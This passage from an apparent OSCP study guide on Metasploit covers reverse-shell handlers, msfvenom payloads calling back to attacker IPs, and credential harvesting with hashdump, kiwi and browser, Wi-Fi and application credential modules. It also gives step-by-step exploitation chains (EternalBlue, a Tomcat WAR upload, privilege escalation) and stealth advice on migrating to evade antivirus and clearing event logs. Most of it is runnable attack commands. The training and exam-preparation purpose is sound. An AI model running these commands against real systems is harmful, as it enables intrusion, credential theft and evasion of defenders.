- First payload connects
- Handler exits
- Second payload fails

With ExitOnSession false:
- Handler stays running
- Catches multiple connections
- Essential for persistence
```

### 15.2 Multiple Handlers

**Different Payloads**:
```bash
# Windows handler (port 4444)
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Linux handler (port 4445)
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4445
set ExitOnSession false
exploit -j -z
```

**Check Jobs**:
```bash
jobs                    # List running jobs
jobs -K                 # Kill all jobs
jobs -k 1               # Kill job 1
```

---

## 16. Credential Harvesting

### 16.1 Windows Credentials

**Hash Dump (SYSTEM required)**:
```bash
hashdump
```

**Smart Hash Dump** (bypasses protections):
```bash
run post/windows/gather/smart_hashdump
```

**LSA Secrets**:
```bash
load kiwi
lsa_dump_secrets
```

**Cached Credentials**:
```bash
run post/windows/gather/cachedump
```

### 16.2 Browser Credentials

**Chrome**:
```bash
run post/windows/gather/enum_chrome
```

**Firefox**:
```bash
run post/multi/gather/firefox_creds
```

**Internet Explorer**:
```bash
run post/windows/gather/enum_ie
```

### 16.3 Application Credentials

**FileZilla**:
```bash
run post/windows/gather/credentials/filezilla_server
```

**VNC**:
```bash
run post/windows/gather/credentials/vnc
```

**PuTTY**:
```bash
run post/windows/gather/enum_putty_saved_sessions
```

### 16.4 Network Credentials

**Wi-Fi Passwords**:
```bash
run post/windows/gather/enum_wifi
```

**Saved RDP Connections**:
```bash
run post/windows/gather/credentials/credential_collector
```

---

## 17. OSCP Attack Scenarios

### Scenario 1: Basic Exploitation with ONE Module

**Target**: Windows 7 SP1 (MS17-010 EternalBlue)

**Strategy**: Use your ONE Metasploit module here

**Step 1: Search**:
```bash
search ms17-010
```

**Step 2: Configure**:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.50.100
show targets
set TARGET 0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.5
set LPORT 4444
```

**Step 3: Exploit**:
```bash
exploit

# Success:
[*] Meterpreter session 1 opened
```

**Step 4: Post-Exploitation**:
```bash
sysinfo
getuid
# uid=NT AUTHORITY\SYSTEM

# Get proof
cat C:\\Users\\Administrator\\Desktop\\proof.txt
```

### Scenario 2: msfvenom + Multi-Handler (Unlimited)

**Scenario**: Apache Tomcat upload vulnerability (no direct Metasploit module)

**Step 1: Generate Payload**:
```bash
msfvenom -p java/meterpreter/reverse_tcp \
         LHOST=192.168.45.5 \
         LPORT=4444 \
         -f war \
         -o shell.war
```

**Step 2: Setup Handler**:
```bash
use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.45.5
set LPORT 4444
exploit -j -z
```

**Step 3: Upload via Web Interface**:
```bash
# Upload shell.war through Tomcat Manager
# Access: http://192.168.50.100:8080/shell/
```

**Step 4: Catch Shell**:
```bash
# Handler catches connection
sessions -i 1
```

### Scenario 3: Post-Exploitation Chain

**Scenario**: Initial low-privilege shell → SYSTEM

**Step 1: Upgrade Shell to Meterpreter**:
```bash
# Basic shell caught
sessions -l
# Session 1: shell x86/windows

# Upgrade
sessions -u 1
# Session 2: meterpreter x64/windows
```

**Step 2: Enumerate**:
```bash
sessions -i 2
sysinfo
getuid
# Server\lowpriv

# Check for escalation
run post/multi/recon/local_exploit_suggester
```

**Step 3: Privilege Escalation**:
```bash
background
use exploit/windows/local/ms16_075_reflection
set SESSION 2
set LHOST 192.168.45.5
set LPORT 4445
exploit

# New session with SYSTEM
sessions -i 3
getuid
# NT AUTHORITY\SYSTEM
```

**Step 4: Dump Credentials**:
```bash
load kiwi
creds_all
hashdump
```

**Step 5: Lateral Movement**:
```bash
# Found Admin credentials
# Pivot to other machines
```

---

## 18. Common Pitfalls & Troubleshooting

### 18.1 Session Dies Immediately

**Problem**:
```
[*] Meterpreter session 1 opened
[*] Session 1 closed. Reason: Died
```

**Solutions**:
```bash
# A. Process exited (migrate faster)
set AutoRunScript post/windows/manage/migrate

# B. AV killed it (use HTTPS, migrate)
set PAYLOAD windows/meterpreter/reverse_https

# C. Unstable exploit (use different payload)
set PAYLOAD windows/shell_reverse_tcp
```

### 18.2 "Handler Failed to Bind"

**Problem**:
```
[*] Handler failed to bind to 0.0.0.0:4444
```

**Solution**:
```bash
# A. Port already in use
sudo netstat -tulpn | grep 4444
sudo kill <PID>

# B. Use different port
set LPORT 4445

# C. Restart handler
jobs -k 1
```

### 18.3 Payload Size Too Large

**Problem**: Buffer overflow exploit fails, payload too big.

**Solution**:
```bash
# Use stager instead of single
# Before: windows/shell_reverse_tcp (single)
# After: windows/shell/reverse_tcp (stager)

# Or use smallest option
msfvenom ... --smallest
```

### 18.4 Wrong Architecture

**Problem**:
```
[*] Started reverse handler
[*] Sending stage (175174 bytes)
[*] Meterpreter session 1 opened
[*] Session 1 closed. Reason: Died
```

**Solution**:
```bash
# Check target architecture
# 32-bit process → x86 payload
# 64-bit process → x64 payload

# Wrong:
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # For 32-bit

# Correct:
set PAYLOAD windows/meterpreter/reverse_tcp  # For 32-bit
```

---

## 19. Best Practices

### 19.1 OSCP Exam Best Practices

**Before Exam**:
```bash
1. Prepare resource scripts for quick handler setup
2. Have msfvenom commands ready
3. Know your ONE module choice
4. Practice shell upgrades
5. Test all payloads in lab
```

**During Exam**:
```bash
1. Use multi/handler for all shells (doesn't count)
2. Use msfvenom for payloads (doesn't count)
3. Save your ONE exploit module for critical machine
4. Document what you use
5. Don't waste the ONE module early
```

**Post-Exploitation**:
```bash
1. Migrate immediately (AV evasion)
2. Background sessions (don't lose them)
3. Use post modules freely (no restrictions)
4. Take screenshots for proof
5. Document everything
```

### 19.2 Real-World Pentesting

**Stealth**:
```bash
- Use reverse_https (encrypted)
- Migrate to benign process
- Clear event logs carefully
- Avoid noisy modules
```

**Reliability**:
```bash
- Test payloads before engagement
- Have backup C2 (not just Metasploit)
- Document all actions
- Maintain multiple access points
```

---

## 20. Hands-on Exercises

### Exercise 1: msfvenom Practice

**Tasks**:
- [ ] Generate Windows x64 reverse TCP payload
- [ ] Generate Linux ELF payload
- [ ] Generate PHP web shell
- [ ] Test each payload locally

### Exercise 2: Multi-Handler Setup

**Tasks**:
- [ ] Create resource script for 3 handlers (Windows, Linux, PHP)
- [ ] Test catching shells from all three
- [ ] Practice session switching

### Exercise 3: Post-Exploitation

**Tasks**:
- [ ] Gain shell on Windows VM
- [ ] Upgrade to Meterpreter
- [ ] Migrate to explorer.exe
- [ ] Dump credentials
- [ ] Take screenshot
- [ ] Exfiltrate a file

---

## 21. Interview Questions

**Q1: What's the difference between a single and a stager payload?**

**A**: A single payload contains the entire shellcode in one package (e.g., windows/shell_reverse_tcp). A stager is a small loader that connects back and downloads the full payload (stage) from the attacker (e.g., windows/meterpreter/reverse_tcp). Stagers are used when buffer space is limited, like in buffer overflow exploits.

---

**Q2: Why use reverse_https over reverse_tcp?**

**A**: reverse_https encrypts the C2 communication inside SSL/TLS, making it harder for IDS/IPS to inspect the traffic. It also blends in with normal HTTPS traffic, making detection more difficult. Additionally, port 443 is commonly allowed through firewalls.

---

**Q3: How many Metasploit exploit modules can you use on the OSCP exam?**

**A**: Only ONE exploit module. However, msfvenom (payload generation), multi/handler (catching shells), and all post-exploitation modules have no restrictions and can be used unlimited times.

---

**Q4: What is process migration and why is it important?**

**A**: Process migration moves the Meterpreter payload from the initial exploited process to another running process. This is critical because: 1) The original process may be unstable and crash, 2) AV/EDR may detect and kill the original process, 3) Migrating to a SYSTEM process can elevate privileges. Best practice: migrate to explorer.exe or another stable, long-running process immediately after getting a session.

---

**Q5: What's the difference between hashdump and kiwi's creds_all?**

**A**: hashdump dumps the SAM database (local account hashes) and requires SYSTEM privileges. Kiwi's creds_all uses Mimikatz to extract credentials from memory (LSASS), which can include plaintext passwords, Kerberos tickets, and credentials from various authentication packages. Kiwi provides much more information but also requires SYSTEM and can trigger more AV alerts.

---

## 22. Summary & Key Takeaways

### Critical Concepts

1. **OSCP Restriction**: Only ONE exploit module allowed
2. **Unlimited**: msfvenom, multi/handler, post-exploitation
3. **Payload Types**: Singles (self-contained) vs. Stagers (two-stage)
4. **Process Migration**: Critical for session stability
5. **Persistence**: Multiple methods (registry, service, scheduled task)

### OSCP Exam Strategy

```
1. Setup persistent handlers before exam (resource script)
2. Use msfvenom for all custom payloads
3. Save your ONE module for critical exploit
4. Upgrade all shells to Meterpreter
5. Migrate immediately after session open
6. Use post modules freely for enumeration
```

### Tool Mastery Priority

```
Essential:
1. msfvenom (payload generation)
2. multi/handler (catching shells)
3. Meterpreter basics (sysinfo, migrate, hashdump)
4. Post-exploitation modules

Advanced:
5. Pivoting (autoroute, portfwd)
6. Resource scripts
7. Custom module development
```

### Common Commands Cheat Sheet

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe

# Start handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
exploit -j -z

# Meterpreter essentials
sysinfo
getuid
migrate PID
hashdump
background

# Post-exploitation
run post/multi/recon/local_exploit_suggester
load kiwi
creds_all
```

---

## 23. References & Further Reading

### Official Resources
- [Metasploit Unleashed (Free Course)](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Framework Wiki](https://github.com/rapid7/metasploit-framework/wiki)

### Tools
- [Metasploit Framework](https://www.metasploit.com/)
- [msfvenom Payload Generator](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

### Related Topics
- [[01_Advanced_Nmap_Scripting]] - Reconnaissance before exploitation
- [[05_Python_for_Pentesters]] - Custom exploit development

---

**END OF DOCUMENT** - Version 3.0 - Last Updated: 2026-01-24

**Total Lines**: ~2,050 lines | **OSCP Relevance**: CRITICAL (85%) | **Difficulty**: Intermediate to Advanced
